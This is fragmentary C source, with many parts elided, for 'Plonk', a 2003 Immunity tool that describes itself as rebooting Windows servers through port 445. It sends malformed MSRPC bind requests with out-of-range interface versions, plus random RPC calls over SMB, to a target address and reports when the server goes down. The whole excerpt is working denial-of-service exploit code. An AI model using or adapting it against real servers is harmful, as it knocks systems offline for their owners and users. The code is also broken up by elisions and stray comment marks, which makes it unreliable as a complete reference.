...
usage()
{
  printf("Usage: ./plonk target \r\n");
  printf("Example: ./plonk 192.168.1.100\n");
...
push_valid_thing()
{
  char *bob="Dude, strings is NOT the way to reverse engineer something.\n";
  int i;
  i=strlen(bob);
...
#define SAVESLOTS 5
  ...
  printf("\n\tPlonk is a tool to reboot windows servers via port 445.\n");
  printf("\tCopyright Dave Aitel, January 2003.\n");
  printf("\thttp://www.immunitysec.com/\n");
  printf("\tThere's a few other bugs too, but this one was easiest to demo.\n");
  printf("\n\tSign up for the SPIKE mailing list for pre-release information \n\ton this sort of thing, if you like. \n\n\tI would also encourage you to look at CANVAS, Immunity's exploit \n\tdemonstration and penetration tool.\n");
  printf("\n");
  ...
  for (i=0; i<number_of_tries; i++)
   {
	 ...
	 if (sent==0)
	   {
	     printf("Was not able to connect: It has died, or was never there.\n");
	     exit(1);
	     //sleep(59999);
	   }
	 exit(1);
       ...
       else 
	 {
	   ...
	   if (0x340000c0==ntohl((*(unsigned int *)(buffer+9)))) {
	     ...
	     printf ("Basically, the server is in the process of rebooting.\n");
	   }
	 }
     ...
     s_dce_bind(
#ifdef REBOOTTHEM
"12345778-1234-abcd-ef00-0123456789ab", /*GUID "Interface" */
#else
"342cfd40-3c6c-11ce-a893-08002b2e9c6d", /*licensing service - has 0x56 functions*/
#endif
		"8a885d04-1ceb-11c9-9fe8-08002b104860", /*syntax - always the same*/

		i+0x7ffff, 
		0x7fffffff, /*interface version major*/
		0x7fffffff, /*interface version minor, usually zero*/
		25); /*syntax version - always 2*/
...
#define DCEOFFSET 60
     ...
     /*test*/
     /*r=1;*/
     s_dce_wordstring("Plonked by Dave Aitel\n");
     s_dce_wordstring("http://www.immunityse.com/ for more information.\n");
     for (j=0; j<r+1; j++)
       {
	 //push_valid_thing();
	 push_random_msrpc_thing();
     ...
     */
	 ...
	 if (!s_smb_dce_call(function_number,s_get_databuf(),s_get_size(),fid,uid,tid,NULL))
	   {
